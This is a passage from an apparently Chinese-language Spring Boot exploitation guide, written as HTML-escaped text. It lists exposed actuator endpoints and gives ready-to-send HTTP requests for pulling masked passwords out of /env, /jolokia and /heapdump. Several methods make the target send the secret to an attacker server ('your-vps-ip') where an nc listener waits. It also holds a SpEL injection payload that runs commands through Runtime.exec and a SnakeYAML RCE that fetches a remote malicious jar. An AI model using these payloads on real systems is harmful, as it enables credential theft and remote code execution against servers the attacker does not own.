相关路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;/mappings&#xA;/metrics&#xA;/beans&#xA;/configprops&#xA;/actuator/metrics&#xA;/actuator/mappings&#xA;/actuator/beans&#xA;/actuator/configprops&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞&lt;/strong&gt;，但是以 &#34;&lt;strong&gt;默认安全&lt;/strong&gt;&#34; 来讲，不暴露出这些信息更加安全。&lt;/p&gt; &#xA;&lt;p&gt;对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。&lt;/p&gt; &#xA;&lt;h3&gt;0x02：配置不当而暴露的路由&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;参考 &lt;a href=&#34;https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints&#34;&gt;production-ready-endpoints&lt;/a&gt; 和 &lt;a href=&#34;https://github.com/artsploit/SecLists/raw/master/Discovery/Web-Content/spring-boot.txt&#34;&gt;spring-boot.txt&lt;/a&gt;，可能因为配置不当而暴露的默认内置路由可能会有：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;/actuator&#xA;/auditevents&#xA;/autoconfig&#xA;/beans&#xA;/caches&#xA;/conditions&#xA;/configprops&#xA;/docs&#xA;/dump&#xA;/env&#xA;/flyway&#xA;/health&#xA;/heapdump&#xA;/httptrace&#xA;/info&#xA;/intergrationgraph&#xA;/jolokia&#xA;/logfile&#xA;/loggers&#xA;/liquibase&#xA;/metrics&#xA;/mappings&#xA;/prometheus&#xA;/refresh&#xA;/scheduledtasks&#xA;/sessions&#xA;/shutdown&#xA;/trace&#xA;/threaddump&#xA;/actuator/auditevents&#xA;/actuator/beans&#xA;/actuator/health&#xA;/actuator/conditions&#xA;/actuator/configprops&#xA;/actuator/env&#xA;/actuator/info&#xA;/actuator/loggers&#xA;/actuator/heapdump&#xA;/actuator/threaddump&#xA;/actuator/metrics&#xA;/actuator/scheduledtasks&#xA;/actuator/httptrace&#xA;/actuator/mappings&#xA;/actuator/jolokia&#xA;/actuator/hystrix.stream&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;其中对寻找漏洞比较重要接口的有：&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;/env&lt;/code&gt;、&lt;code&gt;/actuator/env&lt;/code&gt;&lt;/p&gt; &lt;p&gt;GET 请求 &lt;code&gt;/env&lt;/code&gt; 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；&lt;/p&gt; &lt;p&gt;同时有一定概率可以通过 POST 请求 &lt;code&gt;/env&lt;/code&gt; 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;/refresh&lt;/code&gt;、&lt;code&gt;/actuator/refresh&lt;/code&gt;&lt;/p&gt; &lt;p&gt;POST 请求 &lt;code&gt;/env&lt;/code&gt; 接口设置属性后，可同时配合 POST 请求 &lt;code&gt;/refresh&lt;/code&gt; 接口刷新属性变量来触发相关 RCE 漏洞。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;/restart&lt;/code&gt;、&lt;code&gt;/actuator/restart&lt;/code&gt;&lt;/p&gt; &lt;p&gt;暴露出此接口的情况较少；可以配合 POST请求 &lt;code&gt;/env&lt;/code&gt; 接口设置属性后，再 POST 请求 &lt;code&gt;/restart&lt;/code&gt; 接口重启应用来触发相关 RCE 漏洞。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;/jolokia&lt;/code&gt;、&lt;code&gt;/actuator/jolokia&lt;/code&gt;&lt;/p&gt; &lt;p&gt;可以通过 &lt;code&gt;/jolokia/list&lt;/code&gt; 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;/trace&lt;/code&gt;、&lt;code&gt;/actuator/httptrace&lt;/code&gt;&lt;/p&gt; &lt;p&gt;一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;0x03：获取被星号脱敏的密码的明文 (方法一)&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;目标网站存在 &lt;code&gt;/jolokia&lt;/code&gt; 或 &lt;code&gt;/actuator/jolokia&lt;/code&gt; 接口&lt;/li&gt; &#xA; &lt;li&gt;目标使用了 &lt;code&gt;jolokia-core&lt;/code&gt; 依赖（版本要求暂未知）&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt; &#xA;&lt;p&gt;GET 请求目标网站的 &lt;code&gt;/env&lt;/code&gt; 或 &lt;code&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt; &#xA;&lt;h5&gt;步骤二： jolokia 调用相关 Mbean 获取明文&lt;/h5&gt; &#xA;&lt;p&gt;将下面示例中的 &lt;code&gt;security.user.password&lt;/code&gt; 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 &lt;code&gt;value&lt;/code&gt; 键中。&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;调用 &lt;code&gt;org.springframework.boot&lt;/code&gt; Mbean&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /jolokia&#xA;Content-Type: application/json&#xA;&#xA;{&#34;mbean&#34;: &#34;org.springframework.boot:name=SpringApplication,type=Admin&#34;,&#34;operation&#34;: &#34;getProperty&#34;, &#34;type&#34;: &#34;EXEC&#34;, &#34;arguments&#34;: [&#34;security.user.password&#34;]}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/jolokia&#xA;Content-Type: application/json&#xA;&#xA;{&#34;mbean&#34;: &#34;org.springframework.boot:name=SpringApplication,type=Admin&#34;,&#34;operation&#34;: &#34;getProperty&#34;, &#34;type&#34;: &#34;EXEC&#34;, &#34;arguments&#34;: [&#34;security.user.password&#34;]}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;调用 &lt;code&gt;org.springframework.cloud.context.environment&lt;/code&gt; Mbean&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /jolokia&#xA;Content-Type: application/json&#xA;&#xA;{&#34;mbean&#34;: &#34;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&#34;,&#34;operation&#34;: &#34;getProperty&#34;, &#34;type&#34;: &#34;EXEC&#34;, &#34;arguments&#34;: [&#34;security.user.password&#34;]}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/jolokia&#xA;Content-Type: application/json&#xA;&#xA;{&#34;mbean&#34;: &#34;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&#34;,&#34;operation&#34;: &#34;getProperty&#34;, &#34;type&#34;: &#34;EXEC&#34;, &#34;arguments&#34;: [&#34;security.user.password&#34;]}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;调用其他 Mbean&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;0x04：获取被星号脱敏的密码的明文 (方法二)&lt;/h3&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;可以 GET 请求目标网站的 &lt;code&gt;/env&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/env&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt; &#xA; &lt;li&gt;目标使用了 &lt;code&gt;spring-cloud-starter-netflix-eureka-client&lt;/code&gt; 依赖&lt;/li&gt; &#xA; &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt; &#xA;&lt;p&gt;GET 请求目标网站的 &lt;code&gt;/env&lt;/code&gt; 或 &lt;code&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt; &#xA;&lt;h5&gt;步骤二： 使用 nc 监听 HTTP 请求&lt;/h5&gt; &#xA;&lt;p&gt;在自己控制的外网服务器上监听 80 端口：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -lvk 80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性&lt;/h5&gt; &#xA;&lt;p&gt;将下面 &lt;code&gt;http://value:${security.user.password}@your-vps-ip&lt;/code&gt; 中的 &lt;code&gt;security.user.password&lt;/code&gt; 换成自己想要获取的对应的星号 * 遮掩的属性名；&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;your-vps-ip&lt;/code&gt; 换成自己外网服务器的真实 ip 地址。&lt;/p&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /env&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/env&#xA;Content-Type: application/json&#xA;&#xA;{&#34;name&#34;:&#34;eureka.client.serviceUrl.defaultZone&#34;,&#34;value&#34;:&#34;http://value:${security.user.password}@your-vps-ip&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤四： 刷新配置&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /refresh&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/refresh&#xA;Content-Type: application/json&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤五： 解码属性值&lt;/h5&gt; &#xA;&lt;p&gt;正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 &lt;code&gt;Authorization&lt;/code&gt; 头内容：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Authorization: Basic dmFsdWU6MTIzNDU2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;将其中的 &lt;code&gt;dmFsdWU6MTIzNDU2&lt;/code&gt;部分使用 base64 解码，即可获得类似明文值 &lt;code&gt;value:123456&lt;/code&gt;，其中的 &lt;code&gt;123456&lt;/code&gt; 即是目标星号 * 脱敏前的属性值明文。&lt;/p&gt; &#xA;&lt;h3&gt;0x05：获取被星号脱敏的密码的明文 (方法三)&lt;/h3&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;通过 POST &lt;code&gt;/env&lt;/code&gt; 设置属性触发目标对外网指定地址发起任意 http 请求&lt;/li&gt; &#xA; &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;参考 UUUUnotfound 提出的 &lt;a href=&#34;https://github.com/LandGrey/SpringBootVulExploit/issues/1&#34;&gt;issue-1&lt;/a&gt;，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h5&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt; &#xA;&lt;p&gt;GET 请求目标网站的 &lt;code&gt;/env&lt;/code&gt; 或 &lt;code&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt; &#xA;&lt;h5&gt;步骤二： 使用 nc 监听 HTTP 请求&lt;/h5&gt; &#xA;&lt;p&gt;在自己控制的外网服务器上监听 80 端口：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -lvk 80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤三： 触发对外 http 请求&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;spring.cloud.bootstrap.location&lt;/code&gt; 方法（&lt;strong&gt;同时适用于&lt;/strong&gt;明文数据中有特殊 url 字符的情况）&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /env&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/env&#xA;Content-Type: application/json&#xA;&#xA;{&#34;name&#34;:&#34;spring.cloud.bootstrap.location&#34;,&#34;value&#34;:&#34;http://your-vps-ip/?=${security.user.password}&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;eureka.client.serviceUrl.defaultZone&lt;/code&gt; 方法（&lt;strong&gt;不适用于&lt;/strong&gt;明文数据中有特殊 url 字符的情况）&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /env&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/env&#xA;Content-Type: application/json&#xA;&#xA;{&#34;name&#34;:&#34;eureka.client.serviceUrl.defaultZone&#34;,&#34;value&#34;:&#34;http://your-vps-ip/${security.user.password}&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤四： 刷新配置&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /refresh&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/refresh&#xA;Content-Type: application/json&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;0x06：获取被星号脱敏的密码的明文 (方法四)&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;可正常 GET 请求目标 &lt;code&gt;/heapdump&lt;/code&gt; 或 &lt;code&gt;/actuator/heapdump&lt;/code&gt; 接口&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt; &#xA;&lt;p&gt;GET 请求目标网站的 &lt;code&gt;/env&lt;/code&gt; 或 &lt;code&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt; &#xA;&lt;h5&gt;步骤二： 下载 jvm heap 信息&lt;/h5&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;code&gt;GET&lt;/code&gt; 请求目标的 &lt;code&gt;/heapdump&lt;/code&gt; 或 &lt;code&gt;/actuator/heapdump&lt;/code&gt; 接口，下载应用实时的 JVM 堆信息&lt;/p&gt; &#xA;&lt;h5&gt;步骤三： 使用 MAT 获得 jvm heap 中的密码明文&lt;/h5&gt; &#xA;&lt;p&gt;参考 &lt;a href=&#34;https://landgrey.me/blog/16/&#34;&gt;文章&lt;/a&gt; 方法，使用 &lt;a href=&#34;https://www.eclipse.org/mat/downloads.php&#34;&gt;Eclipse Memory Analyzer&lt;/a&gt; 工具的 &lt;strong&gt;OQL&lt;/strong&gt; 语句&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&#34;password&#34;))&#xA;&#xA;或&#xA;&#xA;select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&#34;password&#34;))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;辅助用 &#34;&lt;strong&gt;password&lt;/strong&gt;&#34; 等关键词快速过滤分析，获得密码等相关敏感信息的明文。&lt;/p&gt; &#xA;&lt;h2&gt;二：远程代码执行&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;0x01：whitelabel error page SpEL RCE&lt;/h3&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0&lt;/li&gt; &#xA; &lt;li&gt;至少知道一个触发 springboot 默认错误页面的接口及参数名&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一：找到一个正常传参处&lt;/h5&gt; &#xA;&lt;p&gt;比如发现访问 &lt;code&gt;/article?id=xxx&lt;/code&gt; ，页面会报状态码为 500 的错误： &lt;code&gt;Whitelabel Error Page&lt;/code&gt;，则后续 payload 都将会在参数 id 处尝试。&lt;/p&gt; &#xA;&lt;h5&gt;步骤二：执行 SpEL 表达式&lt;/h5&gt; &#xA;&lt;p&gt;输入 &lt;code&gt;/article?id=${7*7}&lt;/code&gt; ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。&lt;/p&gt; &#xA;&lt;p&gt;由字符串格式转换成 &lt;code&gt;0x**&lt;/code&gt; java 字节形式，方便执行任意代码：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# coding: utf-8&#xA;&#xA;result = &#34;&#34;&#xA;target = &#39;open -a Calculator&#39;&#xA;for x in target:&#xA;    result += hex(ord(x)) + &#34;,&#34;&#xA;print(result.rstrip(&#39;,&#39;))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;执行 &lt;code&gt;open -a Calculator&lt;/code&gt; 命令&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;漏洞原理：&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;spring boot 处理参数值出错，流程进入 &lt;code&gt;org.springframework.util.PropertyPlaceholderHelper&lt;/code&gt; 类中&lt;/li&gt; &#xA; &lt;li&gt;此时 URL 中的参数值会用 &lt;code&gt;parseStringValue&lt;/code&gt; 方法进行递归解析&lt;/li&gt; &#xA; &lt;li&gt;其中 &lt;code&gt;${}&lt;/code&gt; 包围的内容都会被 &lt;code&gt;org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration&lt;/code&gt; 类的 &lt;code&gt;resolvePlaceholder&lt;/code&gt; 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;漏洞分析：&lt;/h4&gt; &#xA;&lt;p&gt;​ &lt;a href=&#34;https://www.cnblogs.com/litlife/p/10183137.html&#34;&gt;SpringBoot SpEL表达式注入漏洞-分析与复现&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;漏洞环境：&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce&#34;&gt;repository/springboot-spel-rce&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;正常访问：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://127.0.0.1:9091/article?id=66&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;执行 &lt;code&gt;open -a Calculator&lt;/code&gt; 命令：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;http://127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;0x02：spring cloud SnakeYAML RCE&lt;/h3&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt; &#xA; &lt;li&gt;目标依赖的 &lt;code&gt;spring-cloud-starter&lt;/code&gt; 版本 &amp;lt; 1.3.0.RELEASE&lt;/li&gt; &#xA; &lt;li&gt;目标可以请求攻击者的 HTTP 服务器（请求可出外网）&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一： 托管 yml 和 jar 文件&lt;/h5&gt; &#xA;&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 使用 python 快速开启 http server&#xA;&#xA;python2 -m SimpleHTTPServer 80&#xA;python3 -m http.server 80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;在网站根目录下放置后缀为 &lt;code&gt;yml&lt;/code&gt; 的文件 &lt;code&gt;example.yml&lt;/code&gt;，内容如下：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;!!javax.script.ScriptEngineManager [&#xA;  !!java.net.URLClassLoader [[&#xA;    !!java.net.URL [&#34;http://your-vps-ip/example.jar&#34;]&#xA;  ]]&#xA;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;在网站根目录下放置后缀为 &lt;code&gt;jar&lt;/code&gt; 的文件 &lt;code&gt;example.jar&lt;/code&gt;，内容是要执行的代码，代码编写及编译方式参考 &lt;a href=&#34;https://github.com/artsploit/yaml-payload&#34;&gt;yaml-payload&lt;/a&gt;。&lt;/p&gt; &#xA;&lt;h5&gt;步骤二： 设置 spring.cloud.bootstrap.location 属性&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /env&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;spring.cloud.bootstrap.location=http://your-vps-ip/example.yml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/env&#xA;Content-Type: application/json&#xA;&#xA;{&#34;name&#34;:&#34;spring.cloud.bootstrap.location&#34;,&#34;value&#34;:&#34;http://your-vps-ip/example.yml&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤三： 刷新配置&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /refresh&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/refresh&#xA;Content-Type: application/json&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;漏洞原理：&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址&lt;/li&gt; &#xA; &lt;li&gt;refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容&lt;/li&gt; &#xA; &lt;li&gt;SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作&lt;/li&gt; &#xA; &lt;li&gt;先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件&lt;/li&gt; &#xA; &lt;li&gt;然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化&lt;/li&gt; &#xA; &lt;li&gt;实例化类时执行恶意代码，造成 RCE 漏洞&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;漏洞分析：&lt;/h4&gt; &#xA;&lt;p&gt;​ &lt;a href=&#34;https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/&#34;&gt;Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;漏洞环境：&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce&#34;&gt;repository/springcloud-snakeyaml-rce&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;正常访问：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://127.0.0.1:9092/env&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;0x03：eureka xstream deserialization 